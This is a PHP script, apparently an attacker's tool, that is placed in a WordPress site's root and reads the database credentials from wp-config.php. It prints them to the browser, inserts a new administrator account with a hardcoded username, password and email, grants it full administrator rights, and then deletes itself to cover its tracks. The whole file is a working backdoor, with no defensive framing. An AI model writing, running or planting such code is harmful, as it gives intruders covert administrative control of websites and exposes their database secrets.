<?php
/**
 * Script to auto-create a WordPress admin user via direct SQL insertion.
 * Reads database credentials and table prefix from wp-config.php file.
 * 
 * Usage: 
 * - Place this script in the root WordPress directory (where wp-config.php is).
 * - Access this script from browser or CLI.
 */

// Fixed user settings for the new admin user
$new_user_login = 'alvaxploit@123';   // Fixed username
$new_user_pass  = 'alvaxploit@123';        // Fixed password (plaintext)
$new_user_email = 'alvaxploit@gmail.com';    // You can update this email if you want

// Path to wp-config.php file
$wp_config_path = __DIR__ . '/wp-config.php';

// Simple function to parse constants from wp-config.php
function parse_wp_config_constants($file_path, $constants = ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST']) {
    $values = [];
    $content = file_get_contents($file_path);
    foreach ($constants as $const) {
        // Improved regex to match: define('CONST', 'value') or define("CONST", "value")
        if (preg_match("/define\s*\(\s*['\"]" . preg_quote($const, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
            $values[$const] = $matches[1];
        } else {
            $values[$const] = null;
        }
    }
    return $values;
}

// Function to parse $table_prefix from wp-config.php
function parse_table_prefix($file_path) {
    $content = file_get_contents($file_path);
    if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/", $content, $matches)) {
        return $matches[1];
    }
    return 'wp_';  // default if not found
}

// Generate a password hash compatible with WordPress using portable PHPass
class PasswordHash {
    private $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    public $iteration_count_log2;
    public $portable_hashes;
    private $random_state;
    
    public function __construct($iteration_count_log2 = 8, $portable_hashes = true) {
        $this->iteration_count_log2 = $iteration_count_log2;
        $this->portable_hashes = $portable_hashes;
        $this->random_state = microtime() . uniqid(rand(), TRUE);
    }
    
    private function get_random_bytes($count) {
        $output = '';
        if (($fh = @fopen('/dev/urandom', 'rb'))) {
            $output = fread($fh, $count);
            fclose($fh);
        }
        if (strlen($output) < $count) {
            $output = '';
            for ($i = 0; $i < $count; $i += 16) {
                $this->random_state = md5(microtime() . $this->random_state);
                $output .= pack('H*', md5($this->random_state));
            }
            $output = substr($output, 0, $count);
        }
        return $output;
    }
    
    private function encode64($input, $count) {
        $output = '';
        $i = 0;
        do {
            $value = ord($input[$i++]);
            $output .= $this->itoa64[$value & 0x3f];
            if ($i < $count)
                $value |= ord($input[$i]) << 8;
            else
                $output .= $this->itoa64[($value >> 6) & 0x3f];
            if ($i++ >= $count)
                break;
            if ($i < $count)
                $value |= ord($input[$i]) << 16;
            else
                $output .= $this->itoa64[($value >> 12) & 0x3f];
            $output .= $this->itoa64[($value >> 18) & 0x3f];
        } while ($i < $count);
        return $output;
    }
    
    public function crypt_private($password, $setting) {
        $output = '*0';
        if (substr($setting, 0, 2) == $output)
            $output = '*1';
        $id = substr($setting, 0, 3);
        if ($id != '$P$' && $id != '$H$')
            return $output;
        $count_log2 = strpos($this->itoa64, $setting[3]);
        if ($count_log2 < 7 || $count_log2 > 30)
            return $output;
        $count = 1 << $count_log2;
        $salt = substr($setting, 4, 8);
        if (strlen($salt) != 8)
            return $output;
        $hash = md5($salt . $password, TRUE);
        do {
            $hash = md5($hash . $password, TRUE);
        } while (--$count);
        $output = substr($setting, 0, 12);
        $output .= $this->encode64($hash, 16);
        return $output;
    }
    
    public function gensalt_private($input) {
        $itoa64 = $this->itoa64;
        $output = '$P$';
        $count_log2 = min($this->iteration_count_log2 + 5, 30);
        $output .= $itoa64[$count_log2];
        $output .= $this->encode64($input, 6);
        return $output;
    }
    
    public function hash_password($password) {
        $random = '';
        if (strlen($random) < 6)
            $random = $this->get_random_bytes(6);
        $hash = $this->crypt_private($password, $this->gensalt_private($random));
        if (strlen($hash) == 34)
            return $hash;
        return md5($password);
    }
}

echo "<pre>";

// Step 1: Parse wp-config.php for DB details
if (!file_exists($wp_config_path)) {
    die("Error: wp-config.php file not found at $wp_config_path\n");
}

$db_constants = parse_wp_config_constants($wp_config_path, ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST']);
$table_prefix = parse_table_prefix($wp_config_path);

// Debugging output
echo "Parsed DB Constants:\n";
print_r($db_constants);
echo "Parsed Table Prefix: $table_prefix\n";

// Check if all required credentials are found
if (in_array(null, $db_constants, true)) {
    die("Error: Could not find all database credentials (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST) in wp-config.php\n");
}

$db_name = $db_constants['DB_NAME'];
$db_user = $db_constants['DB_USER'];
$db_password = $db_constants['DB_PASSWORD'];
$db_host = $db_constants['DB_HOST'];

// Connect to MySQL
$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}

// Check if username already exists
$stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ?");
$stmt->bind_param('s', $new_user_login);
$stmt->execute();
$stmt->store_result();
if ($stmt->num_rows > 0) {
    die("Error: Username '{$new_user_login}' already exists in the database.\n");
}
$stmt->close();

// Prepare password hash
$hasher = new PasswordHash();
$password_hash = $hasher->hash_password($new_user_pass);
if (!$password_hash) {
    die("Error generating password hash.\n");
}

// Prepare other user data
$time = current_time('mysql');
if (!$time) {
    // fallback if current_time function missing (outside WP)
    $time = date('Y-m-d H:i:s');
}

// Insert new user into wp_users table
$stmt = $mysqli->prepare("
INSERT INTO `{$table_prefix}users` 
(user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) 
VALUES (?, ?, ?, ?, '', ?, '', 0, ?)
");

$user_nicename = strtolower($new_user_login);
$display_name = $new_user_login;

if (!$stmt) {
    die("Prepare statement error: " . $mysqli->error . "\n");
}

$stmt->bind_param('ssssss', $new_user_login, $password_hash, $user_nicename, $new_user_email, $time, $display_name);

if (!$stmt->execute()) {
    die("Error inserting user: " . $stmt->error . "\n");
}

$new_user_id = $stmt->insert_id;
$stmt->close();

// Capability and user level meta keys
$cap_key = $table_prefix . 'capabilities';
$level_key = $table_prefix . 'user_level';

// Capability value for admin user - serialized array
$capabilities = serialize(array('administrator' => true));

// Insert user meta wp_capabilities
$stmt = $mysqli->prepare("
INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)
");

if (!$stmt) {
    die("Prepare statement error (wp_capabilities): " . $mysqli->error . "\n");
}

$stmt->bind_param('iss', $new_user_id, $cap_key, $capabilities);
if (!$stmt->execute()) {
    die("Error inserting usermeta (capabilities): " . $stmt->error . "\n");
}
$stmt->close();

// Insert user meta wp_user_level
$user_level = 10;
$stmt = $mysqli->prepare("
INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)
");
if (!$stmt) {
    die("Prepare statement error (wp_user_level): " . $mysqli->error . "\n");
}
$level_value = (string)$user_level;
$stmt->bind_param('iss', $new_user_id, $level_key, $level_value);
if (!$stmt->execute()) {
    die("Error inserting usermeta (user_level): " . $stmt->error . "\n");
}
$stmt->close();

echo "Success! WordPress admin user '{$new_user_login}' created with user ID {$new_user_id}.\n";

$mysqli->close();
echo "</pre>";

// Helper function for WordPress current_time function fallback
function current_time($type) {
    if ($type === 'mysql') {
        return date('Y-m-d H:i:s');
    }
    return time();
}

$roots=$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'];
unlink($roots);

?>
